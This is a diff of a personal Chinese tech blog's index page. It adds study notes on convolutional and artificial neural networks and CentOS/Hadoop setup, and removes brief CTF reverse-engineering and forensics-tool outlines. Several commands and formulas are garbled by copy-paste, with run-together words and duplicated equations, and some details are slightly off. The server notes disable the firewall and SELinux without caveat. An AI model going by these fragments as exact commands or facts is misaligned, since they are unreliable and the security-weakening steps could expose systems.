+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2017/10/08/Covolutions Neural Netwrk/">Covolutions Neural Netwrk</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/10/08/Covolutions Neural Netwrk/" class="article-date">
+	  <time datetime="2017-10-08T15:53:56.000Z" itemprop="datePublished">2017-10-08</time>
+	</a>
+
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Covolutions-Neural-Netwrk"><a href="#Covolutions-Neural-Netwrk" class="headerlink" title="Covolutions Neural Netwrk"></a>Covolutions Neural Netwrk</h3><p>​    卷积神经网络有三种层：卷积层、池化层和全连接层（Convolutional Layer, Pooling Layer, 及Fully-Connected Layer）。 </p>
+<p>[INPUT - CONV - RELU -x POOL - FC]            也就是  [输入-卷积-激活-池化-分类得分</p>
+<p>卷积神经网络是计算机自主学习的一种方式。（自学习） 卷积神经网络（CNN）</p>
+<p>由Huabel与Wiesel在研究猫的脑皮层中用局部敏感和方法选择的神经元时发现其独特的网络结构可以有效的降低反馈神经网络的复杂性提出。</p>
+<p>DCNN（Deep ConvolutionalNeural Network，深度卷积网络）与LSTM（LongShort Term Memory，长短时记忆网络）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据-》自学习-》结果</span><br><span class="line"></span><br><span class="line">输入-》 算法 -》输出</span><br></pre></td></tr></table></figure>
+<p><strong>空间共享</strong></p>
+<p>​    计算机视觉里经常使卷积神经网络，即CNN，是一种对人脑比较精准的模拟。</p>
+<p>​    <strong>什么是卷积？卷积就是两个函数之间的相互关系，然后得出一个新的值，他是在连续空间做积分计算，然后在离散空间内求和的过程。实际上在计算机视觉里面，可以把卷积当做一个抽象的过程，就是把小区域内的信息统计抽象出来。</strong></p>
+<p><strong>    比如，对于一张爱因斯坦的照片，我可以学习n个不同的卷积和函数，然后对这个区域进行统计。可以用不同的方法统计，比如着重统计中央，也可以着重统计周围，这就导致统计的和函数的种类多种多样，为了达到可以同时学习多个统计的累积和。</strong></p>
+<p>从LeNet到AlexNet</p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/1clip_image001.jpg" alt="clip_image00"></p>
+<p>物体检测问题</p>
+<p>Region CNN YOLO</p>
+<p>FACEBOOK提出来的YOLO网络，物体检测，</p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/1clip_image004.gif" alt="clipboard.png"></p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/1clip_image006.gif" alt="clip_image00"></p>
+<p>权重 W 与偏移量B  相同     不同的是输入的值</p>
+<p>ConvNet体系结构：<strong>卷积层</strong>，<strong>池层</strong>和<strong>完全连接层</strong>（正如在常规神经网络中所见）</p>
+<h3 id="ConvNet"><a href="#ConvNet" class="headerlink" title="ConvNet"></a><strong>ConvNet</strong></h3><p>C++中卷积神经网络的GPU实现</p>
+<p>一个示例ConvNet架构的激活。初始卷存储原始图像像素（左），最后一个卷存储类分数（右）。沿着处理路径的每个激活量显示为一列。由于难以将3D体积可视化，因此我们将行卷切成行。最后一层卷保留每个类的分数，但在这里我们只可视化排序的前5个分数，并打印每个分数的标签。完整<a href="http://cs231n.stanford.edu/" target="_blank" rel="noopener">的基于Web的演示文稿</a>显示在我们网站的标题中。这里所示的架构是一个小型的VGG网络，稍后将讨论。</p>
+<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/clip_image008.gif" alt="clipboard.png"></p>
+<p>双曲正切函数是双曲函数中的一个函数。</p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/1clip_image010.gif" alt="clip_image01"></p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/1clip_image012.gif" alt="clip_image01"><img src="http://oizzgpxb7.bkt.clouddn.com//ml/1clip_image014.gif" alt="clip_image01"></p>
+<p><strong>输入图像I。</strong>为了减小复杂度，一般使用灰度图像。当然，也可以使用RGB彩色图像，此时输入图像有三张，分别为RGB分量。输入图像一般需要归一化，1、如果使用sigmoid激活函数，则归一化到[0,1]        2、 如果使用tanh激活函数，则归一化到[-1, 1]。</p>
+<p><strong>多个卷积（C）-下采样（S）层</strong>。将上一层的输出与本层权重W做卷积得到各个C层，然后下采样得到各个S层。怎么做以及为什么，下面会具体分析。这些层的输出称为FeatureMap。</p>
+<p><strong>光栅化（X）</strong>。是为了与传统的多层感知器全连接。即将上一层的所有Feature Map的每个像素依次展开，排成一列。</p>
+<p><strong>传统的多层感知器（N&amp;O）</strong>。最后的分类器一般使用Softmax，如果是二分类，当然也可以使用LR。</p>
+<h4 id="输入层-隐层："><a href="#输入层-隐层：" class="headerlink" title="输入层-隐层："></a><strong>输入层-隐层：</strong></h4><p>是一个全连接的网络，即每个输入节点都连接到所有的隐层节点上。更详细地说，可以把输入层视为一个向量 xx ，而隐层节点 jj 有一个权值向量 θjθj 以及偏置 bjbj ，激活函数使用 <em>sigmoid</em> 或 <em>tanh</em> ，那么这个隐层节点的输出应该是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fj(x)=act(θTjx+bj)fj(x)=act(θjTx+bj)</span><br></pre></td></tr></table></figure>
+<p>也就是每个隐层节点都相当于一个感知器。每个隐层节点产生一个输出，那么隐层所有节点的输出就成为一个向量，即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f(x)=act(Θx+b)f(x)=act(Θx+b)</span><br></pre></td></tr></table></figure>
+<p>若输入层有 mm 个节点，隐层有 nn 个节点，那么 Θ=[θT]Θ=[θT] 为 n×mn×m 的矩阵，xx 为长为 mm 的向量，bb 为长为 nn 的向量，激活函数作用在向量的每个分量上， f(x)f(x) 返回一个向量。</p>
+<h4 id="隐层-输出层"><a href="#隐层-输出层" class="headerlink" title="隐层-输出层:"></a><strong>隐层-输出层</strong>:</h4><p>可以视为级联在隐层上的一个感知器。若为二分类，则常用LogisticRegression；若为多分类，则常用Softmax Regression。</p>
+<p><strong>卷积、下采样、光栅化、多层感知器预测</strong></p>
+<h5 id="卷积"><a href="#卷积" class="headerlink" title="卷积"></a>卷积</h5><p>离散卷积运算。假设有二维离散函数 f(x,y),g(x,y) ， 那么它们的卷积定义为</p>
+<p><img src="file:///C:/Users/shackle/AppData/Local/Temp/msohtmlclip1/01/1clip_image016.gif" alt="clipboard.png"></p>
+<p>从这里，可以看到卷积的重要的物理意义是：一个函数（如：单位响应）在另一个函数（如：输入信号）上的<strong>加权叠加。</strong></p>
+<h5 id="下采样"><a href="#下采样" class="headerlink" title="下采样"></a>下采样</h5><p>下采样，即池化，目的是减小特征图，池化规模一般为2×2。常用的池化方法有：</p>
+<p>最大池化（Max Pooling）。取4个点的最大值。这是最常用的池化方法。</p>
+<p>均值池化（Mean Pooling）。取4个点的均值。</p>
+<p>高斯池化。借鉴高斯模糊的方法。不常用。具体过程不是很清楚。。。</p>
+<p>可训练池化。训练函数 f ，接受4个点为输入，出入1个点。不常用。</p>
+<h5 id="光栅化"><a href="#光栅化" class="headerlink" title="光栅化"></a>光栅化</h5><p>图像经过池化-下采样后，得到的是一系列的特征图，而多层感知器接受的输入是一个向量。因此需要将这些特征图中的像素依次取出，排列成一个向量。具体说，对特征图 X1,X2,…,Xj ，光栅化后得到的向量</p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/1clip_image018.gif" alt="clip_image01"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/机器学习/">机器学习</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-服务器配置"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2017/10/05/服务器配置/">服务器配置</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/10/05/服务器配置/" class="article-date">
+	  <time datetime="2017-10-05T15:53:56.000Z" itemprop="datePublished">2017-10-05</time>
+	</a>
+
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h2><p>CentOS教程 / 软件使用配置</p>
+<p><a href="http://www.centoscn.com/image-text/config/" target="_blank" rel="noopener">http://www.centoscn.com/image-text/config/</a></p>
+<p>CentOS 修改主机名 - Virson Ma - 博客园</p>
+<p><a href="http://www.cnblogs.com/mawanglin2008/p/3530790.html" target="_blank" rel="noopener">http://www.cnblogs.com/mawanglin2008/p/3530790.html</a></p>
+<p>区别 chown和chmod的用法 - 博客频道 - CSDN.NET</p>
+<p><a href="http://blog.csdn.net/doupei2006/article/details/8015986" target="_blank" rel="noopener">http://blog.csdn.net/doupei2006/article/details/8015986</a></p>
+<p>chown用法</p>
+<p>用来更改某个目录或文件的用户名和用户组的</p>
+<p>chown 用户名:组名文件路径（可以是就对路径也可以是相对路径）</p>
+<p>例1：chown root:root /tmp/tmp1</p>
+<p>就是把tmp下的tmp1的用户名和用户组改成root和root（只修改了tmp1的属组）.</p>
+<p>例2：chown -R root:root /tmp/tmp1</p>
+<p>就是把tmp下的tmp1下的所有文件的属组都改成root和root。</p>
+<p>chmod用法</p>
+<p>用来修改某个目录或文件的访问权限。</p>
+<p>语法：chmod [who] [+ | - | =] [mode] 文件名</p>
+<p> 命令中各选项的含义为： </p>
+<p>操作对象who可是下述字母中的任一个或者它们的组合：</p>
+<p> 　　u 表示“用户（user）”，即文件或目录的所有者。</p>
+<p> 　　g 表示“同组（group）用户”，即与文件属主有相同组ID的所有用户。</p>
+<p> 　　o 表示“其他（others）用户”。</p>
+<p> 　　a 表示“所有（all）用户”。它是系统默认值。</p>
+<p><a href="interm">Hadoop2.7.3完全分布式集群搭建和测试 - 如果一切重来 - 博客频道 - CSDN.NET</a></p>
+<p><a href="http://blog.csdn.net/xiaoxiangzi222/article/details/52757168" target="_blank" rel="noopener">http://blog.csdn.net/xiaoxiangzi222/article/details/52757168</a></p>
+<p>细细品味Hadoop - 随笔分类 - 虾皮 -博客园</p>
+<p><a href="http://www.cnblogs.com/xia520pi/category/346943.html" target="_blank" rel="noopener">http://www.cnblogs.com/xia520pi/category/346943.html</a></p>
+<p>低版本物理机部署高版本OVF 报“硬件系列vmx12不受支持“解决办法 - 搬砖笔记 - 博客频道 - CSDN.NET</p>
+<p><a href="http://blog.csdn.net/xfks55/article/details/52858622" target="_blank" rel="noopener">http://blog.csdn.net/xfks55/article/details/52858622</a></p>
+<p>vim /etc/sysconfig/network-scripts/ifcgf-eth0  静态地址</p>
+<p> <strong>scp -r /usr/hadooproot@node1:/usr/hadoop</strong></p>
+<p>Usage: hdfs [–config confdir] [–loglevel loglevel] COMMAND</p>
+<p>​       where COMMAND is oneof:</p>
+<p>  dfs                  run a filesystem command onthe file systems supported in Hadoop.</p>
+<p>  classpath            prints the classpath</p>
+<p>  namenode -format     format the DFS filesystem</p>
+<p>  secondarynamenode    run the DFS secondary namenode</p>
+<p>  namenode             run the DFS namenode</p>
+<p>  journalnode          run the DFS journalnode</p>
+<p>  zkfc                 run the ZK Failover Controllerdaemon</p>
+<p>  datanode             run a DFS datanode</p>
+<p>  dfsadmin             run a DFS admin client</p>
+<p>  haadmin              run a DFS HA admin client</p>
+<p>  fsck                 run a DFS filesystem checkingutility</p>
+<p>  balancer             run a cluster balancing utility</p>
+<p>  jmxget               get JMX exported values fromNameNode or DataNode.</p>
+<p>  mover                run a utility to move block replicasacross</p>
+<p>​                       storagetypes</p>
+<p>  oiv                  apply the offline fsimageviewer to an fsimage</p>
+<p>  oiv_legacy           apply the offline fsimage viewer toan legacy fsimage</p>
+<p>  oev                  apply the offline editsviewer to an edits file</p>
+<p>  fetchdt              fetch a delegation token from theNameNode</p>
+<p>  getconf              get config values fromconfiguration</p>
+<p>  groups               get the groups which usersbelong to</p>
+<p>  snapshotDiff         diff two snapshots of a directory ordiff the</p>
+<p>​                       currentdirectory contents with a snapshot</p>
+<p>  lsSnapshottableDir   list all snapshottable dirs owned by thecurrent user</p>
+<p>​                                                Use -help to see options</p>
+<p>  portmap              run a portmap service</p>
+<p>  nfs3                 run an NFS version 3 gateway</p>
+<p>  cacheadmin           configure the HDFS cache</p>
+<p>  crypto               configure HDFS encryption zones</p>
+<p>  storagepolicies      list/get/set block storage policies</p>
+<p>  version              print the version</p>
+<p>1、关闭firewall：</p>
+<p>systemctl stopfirewalld.service #停止firewall</p>
+<p>systemctl disablefirewalld.service #禁止firewall开机启动</p>
+<p>firewall-cmd –state #查看默认防火墙状态（关闭后显示notrunning，开启后显示running）</p>
+<p>关闭selinux</p>
+<p>　　<strong>2）禁用selinux</strong></p>
+<p>​    编辑 “<strong>/etc/selinux/config</strong>“文件，设置”<strong>SELINUX</strong>=<strong>disabled</strong>“</p>
+<p><strong>nano slave</strong></p>
+<p><strong>bin/hdfs namenode -**</strong>format sbin/start-all.sh**</p>
+<p>hdfs  dfsadmin -report </p>
+<p>yum installjava-1.7.0-openjdk-devel.x86_64  安装jps</p>
+<p>Hadoop 启动节点Datanode失败解决_服务器应用_Linux公社-Linux系统门户网站</p>
+<p><a href="http://www.linuxidc.com/Linux/2014-11/108822.htm" target="_blank" rel="noopener">http://www.linuxidc.com/Linux/2014-11/108822.htm</a></p>
+<p>先格式化再启动</p>
+<p>出现该问题的原因：在第一次格式化dfs后，启动并使用了hadoop，后来又重新执行了格式化命令（hdfs namenode -format)，这时namenode的clusterID会重新生成，而datanode的clusterID 保持不变。</p>
+<p>删除初始文件</p>
+<p>hadoop集群只有一个datanode启动问题 - yijichangkong的专栏 - 博客频道 - CSDN.NET</p>
+<p><a href="http://blog.csdn.net/yijichangkong/article/details/45438931" target="_blank" rel="noopener">http://blog.csdn.net/yijichangkong/article/details/45438931</a></p>
+<p>onlyoffice/documentserver - Docker Hub</p>
+<p><a href="https://hub.docker.com/r/onlyoffice/documentserver/" target="_blank" rel="noopener">https://hub.docker.com/r/onlyoffice/documentserver/</a></p>
+<p>快速入门指南</p>
+<p><a href="http://docs.rancher.com/rancher/v1.5/en/quick-start-guide/" target="_blank" rel="noopener">http://docs.rancher.com/rancher/v1.5/en/quick-start-guide/</a></p>
+<p><a href="http://mattermost.org/" target="_blank" rel="noopener">最重要的</a> - 开源的，首选的Slack-alternative</p>
+<p><a href="https://bitnami.com/" target="_blank" rel="noopener">https://bitnami.com/</a></p>
+<p><a href="https://www.nagios.org/" target="_blank" rel="noopener">https://www.nagios.org/</a></p>
+<p><a href="http://wiki.pentaho.com/display/COM/Community+Wiki+Home" target="_blank" rel="noopener">http://wiki.pentaho.com/display/COM/Community+Wiki+Home</a></p>
+<p><a href="https://bitnami.com/stacks/project-management" target="_blank" rel="noopener">https://bitnami.com/stacks/project-management</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/运维/">运维</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-人工神经网络"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2017/10/05/人工神经网络/">人工神经网络</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/10/05/人工神经网络/" class="article-date">
+	  <time datetime="2017-10-05T15:53:56.000Z" itemprop="datePublished">2017-10-05</time>
+	</a>
+
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="人工神经网络"><a href="#人工神经网络" class="headerlink" title="人工神经网络"></a>人工神经网络</h2><p><strong>人工神经网络最重要的是 :   分类</strong></p>
+<p>神经网络分类： </p>
+<ol>
+<li><p>ANN（人工神经网络）</p>
+</li>
+<li><p>LSTM （循环神经网络）  时间共享</p>
+</li>
+<li><p>CNN（卷积神经网络）空间共享</p>
+<p>基本流程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分类样本--》训练样本--》建模--》测试样本--》结果</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>参考：<a href="https://www.zhihu.com/question/22553761" target="_blank" rel="noopener">https://www.zhihu.com/question/22553761</a></p>
+<h4 id="空间切一刀-某种激活函数-0-1阶跃、sigmoid、-sigmoid-（或者-tanh-）-但是可以一层一层级联"><a href="#空间切一刀-某种激活函数-0-1阶跃、sigmoid、-sigmoid-（或者-tanh-）-但是可以一层一层级联" class="headerlink" title="空间切一刀  +   某种激活函数(0-1阶跃、sigmoid、, sigmoid （或者 tanh ）),  但是可以一层一层级联"></a>空间切一刀  +   某种激活函数(0-1阶跃、sigmoid、, <em>sigmoid</em> （或者 <em>tanh</em> ）),  但是可以一层一层级联</h4><p>​      这一层是下一层的输入。       </p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image002.gif" alt="clipboard.png"></p>
+<p>​    类似于人类大脑的神经元之间能够不断的调节连接强度从而达到不断的训练与学习的目的，人工神经网络同样可以做到不断的调整输入连接上的权值使得该神经网络能够更加的适应训练集合。</p>
+<p>​    在人工神经网络方法学习训练的过程当中，学习样本的特征向量被传递进输入端作为输入的数据，分类结果作为学习样本的输出，也是整个网络的输出；然后，人工神经网络将会根据上一步的样本输出调节输入的权值 w，使得训练之后的误差逐步减小。通过不断的训练与调整的过程，使得训练样本的实际输出越来越接近于真实目标。</p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image004.gif" alt="clipboard.png"></p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image006.gif" alt="clipboard.png"></p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image008.gif" alt="clipboard.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">其中函数 f（）称为非线性激活函数，激活函数根据实际应用确定，调整权值。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">反向传播算法  ：  结果反向决定输入，不断调整权值，</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">常用激活  函数  ：  logistic   Sigmoid    sign , tanh</span><br></pre></td></tr></table></figure>
+<h4 id="感知机："><a href="#感知机：" class="headerlink" title="感知机："></a>感知机：</h4><p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image010.gif" alt="clipboard.png"></p>
+<p>其中激活函数 <em>act</em> 可以使用{<em>sign, sigmoid, tanh</em>}之一。</p>
+<p>l 激活函数使用符号函数 <em>sign</em> ，可求解损失函数最小化问题，通过梯度下降确定参数</p>
+<p>l 激活函数使用 <em>sigmoid</em> （或者 <em>tanh</em> ），则分类器事实上成为Logistic Regression，可通过梯度上升极大化似然函数，或者梯度下降极小化损失函数，来确定参数</p>
+<p>l 如果需要多分类，则事实上成为SoftmaxRegression</p>
+<p>l 如要需要分离超平面恰好位于正例和负例的正中央，则成为支持向量机（SVM）。</p>
+<h4 id="多层感知器"><a href="#多层感知器" class="headerlink" title="多层感知器"></a>多层感知器</h4><p>感知器存在的问题是，对线性可分数据工作良好，如果设定迭代次数上限，则也能一定程度上处理近似线性可分数据。但是对于非线性可分的数据，比如最简单的异或问题，感知器就无能为力了。这时候就需要引入多层感知器这个大杀器。</p>
+<p>多层感知器的思路是，尽管原始数据是非线性可分的，但是可以通过某种方法将其映射到一个线性可分的高维空间中，从而使用线性分类器完成分类。图1中，从X到O这几层，正展示了多层感知器的一个典型结构，即输入层-隐层-输出层。</p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image012.gif" alt="clipboard.png"></p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image014.gif" alt="clipboard.png"></p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image016.gif" alt="clipboard.png"></p>
+<h3 id="logistic-函数"><a href="#logistic-函数" class="headerlink" title="logistic   函数"></a>logistic   函数</h3><h5 id="非对称："><a href="#非对称：" class="headerlink" title="非对称："></a>非对称：</h5><p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image018.gif" alt="clipboard.png"></p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image020.gif" alt="clipboard.png"></p>
+<h5 id="对称："><a href="#对称：" class="headerlink" title="对称："></a>对称：</h5><p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image022.gif" alt="clipboard.png"></p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image024.gif" alt="clipboard.png"></p>
+<h3 id="反馈神经网络-BP神经网络"><a href="#反馈神经网络-BP神经网络" class="headerlink" title="反馈神经网络  BP神经网络"></a>反馈神经网络  BP神经网络</h3><p>Hebb改变权重上个神经元进行调整 。学习是一类相关学习，算法的基本思想是：如果有两个神经元同时兴奋，则它们之间的连接强度的增强与它们的激励的乘积成正比</p>
+<p>在Hebb学习规则中，学习信号简单地等于神经元的输出：</p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image026.gif" alt="clipboard.png"></p>
+<p>用yi(k)表示单元i 在k 时刻的激活值（输出），yj (k)表示单元j在 k 时刻的激活值，wij(k)表示单元i到单元j的连接权值，则Hebb学习规则可表示如下：</p>
+<p>∆Wij(k)=Wij(k+1)-Wij(k)=η<em>yi(k)</em>yj(k+1),式中η为学习速率</p>
+<p><strong>权值调整量与输入输出的乘积成正比。</strong></p>
+<p><img src="http://oizzgpxb7.bkt.clouddn.com//ml/clip_image028.gif" alt="clipboard.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/机器学习/">机器学习</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
     <article id="post-机器学习重要算法"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="article-inner">
     
@@ -290,7 +886,7 @@
 <li>决策树分类法，</li>
 <li>朴素的贝叶斯分类算法(native Bayesian classifier)(NBC)、</li>
 <li>基于支持向量机(SVM)的分类器，</li>
-<li>神经网络法(SNN)，</li>
+<li>神经网络法(SNN)，  神经网络（CNN)</li>
 <li>模糊分类法等等</li>
 </ul>
 </li>
@@ -611,8 +1207,7 @@
 <h3 id="车联网"><a href="#车联网" class="headerlink" title="车联网"></a>车联网</h3><h5 id="汽车现状：智能化-，网联化，电动化"><a href="#汽车现状：智能化-，网联化，电动化" class="headerlink" title="汽车现状：智能化 ，网联化，电动化"></a>汽车现状：智能化 ，网联化，电动化</h5><ol>
 <li><p>车载系统</p>
 </li>
-<li><p>​</p>
-</li>
+<li></li>
 <li><p>安全现状 ：</p>
 </li>
 <li><p>车联网安全解决方案</p>
@@ -640,7 +1235,6 @@
 <li>主要测传输机制csma/cd</li>
 <li>CAN是控制器局域网络(Controller Area Network, CAN)的简称</li>
 <li>一种通讯协议（类似TCP IP协议）</li>
-<li>​</li>
 </ol>
 </li>
 <li><p>车载网络 C类网络</p>
@@ -737,587 +1331,6 @@
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-CTF-逆向 基础"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/08/29/CTF-逆向 基础/">CTF-逆向 基础</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/08/29/CTF-逆向 基础/" class="article-date">
-	  <time datetime="2017-08-29T15:53:56.000Z" itemprop="datePublished">2017-08-29</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="CTF-逆向-基础"><a href="#CTF-逆向-基础" class="headerlink" title="CTF-逆向 基础"></a>CTF-逆向 基础</h1><p><a href="http://shackles.top/2017/08/07/%E9%80%86%E5%90%91/"> 2017-08-07</a></p>
-<p><a href="https://www.gitbook.com/book/wizardforcel/re-for-beginners/details" target="_blank" rel="noopener">https://www.gitbook.com/book/wizardforcel/re-for-beginners/details</a></p>
-<h4 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h4><ul>
-<li>ida 调试 安卓 native层</li>
-<li>设置断点</li>
-<li>设置程序 安卓附加上去，IDA F5调试</li>
-</ul>
-<h4 id="去除软件保护"><a href="#去除软件保护" class="headerlink" title="去除软件保护"></a>去除软件保护</h4><ul>
-<li><p>侦壳 PEID Exelnfo （查看是什么壳）</p>
-</li>
-<li><p>脱壳</p>
-<ul>
-<li>脱壳机</li>
-<li>esp 定快速脱壳</li>
-</ul>
-</li>
-<li><p>去除花指令</p>
-<ul>
-<li>OLLyDBG脚本</li>
-</ul>
-</li>
-<li><p>去除混淆</p>
-<ul>
-<li><p>net 反混淆de4dot</p>
-<h4 id="定位验证代码"><a href="#定位验证代码" class="headerlink" title="定位验证代码"></a>定位验证代码</h4></li>
-</ul>
-</li>
-<li><p>验证代码（算法）</p>
-<ol>
-<li><p>正面驱动直入</p>
-</li>
-<li><p>从输入输出寻找</p>
-</li>
-<li><p>利用字符串找</p>
-<h4 id="CTF逆向常见算法"><a href="#CTF逆向常见算法" class="headerlink" title="CTF逆向常见算法"></a>CTF逆向常见算法</h4></li>
-</ol>
-</li>
-<li><p>简单算法</p>
-</li>
-</ul>
-<ol>
-<li>简单异或</li>
-<li>带雪崩的异或</li>
-<li>加密算法（AES , RSA)</li>
-<li>散列算法（MD5，SHA1)</li>
-<li>解方程</li>
-</ol>
-<ul>
-<li>有趣的算法</li>
-</ul>
-<ol>
-<li><p>走迷宫</p>
-</li>
-<li><p>..各种脑洞</p>
-<h4 id="经验加成"><a href="#经验加成" class="headerlink" title="经验加成"></a>经验加成</h4></li>
-<li><p>边信道攻击</p>
-</li>
-<li><p>Google 大法好</p>
-</li>
-<li><p>逆向trick</p>
-<ol>
-<li>xspy 应对MFC程序</li>
-<li>手动加载signature</li>
-<li>调试小技巧</li>
-</ol>
-</li>
-</ol>
-<p>CTF VS 现实</p>
-<ol>
-<li><p>IDA高级使用</p>
-</li>
-<li><p>​</p>
-</li>
-</ol>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-ctf-misc"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/08/19/ctf-misc/">CTF-Misc</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/08/19/ctf-misc/" class="article-date">
-	  <time datetime="2017-08-19T15:53:56.000Z" itemprop="datePublished">2017-08-19</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="CTF-Misc"><a href="#CTF-Misc" class="headerlink" title="CTF-Misc"></a>CTF-Misc</h1><p><a href="http://shackles.top/2017/08/06/misc/"> 2017-08-06</a></p>
-<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="先上一些常用命令"><a href="#先上一些常用命令" class="headerlink" title="先上一些常用命令"></a>先上一些常用命令</h2><p>strings // 查找字符</p>
-<p>foremost // 自动分离</p>
-<p>binwalk // binwalk -e 自动提取</p>
-<p>diff // 对比文件</p>
-<p>pacpfix // pcap文件修复工具</p>
-<p>DShell</p>
-<p>tshark // 命令行提取数据包 或者tcpdump</p>
-<h3 id="Recon-信息收集"><a href="#Recon-信息收集" class="headerlink" title="Recon(信息收集)"></a>Recon(信息收集)</h3><p>很少出现</p>
-<h3 id="Encode"><a href="#Encode" class="headerlink" title="Encode"></a>Encode</h3><p>编码</p>
-<ul>
-<li><p>各种进制</p>
-<p>​</p>
-<p>二进制转化为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ASCII</span><br><span class="line">二维码</span><br><span class="line">图片</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>base家族 base64 32 16</p>
-</li>
-<li><p>曼彻斯特编码/差分曼彻斯特编码</p>
-</li>
-</ul>
-<h4 id="二进制编码"><a href="#二进制编码" class="headerlink" title="二进制编码"></a>二进制编码</h4><p>工具：JpocketKnife<br>1.得到的二进制有可能7位一组，正常八位一组<br>2.二维码：二进制串的长度是一个平方数<br>3.因式分解其长度</p>
-<h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><p>编码方式：</p>
-<ul>
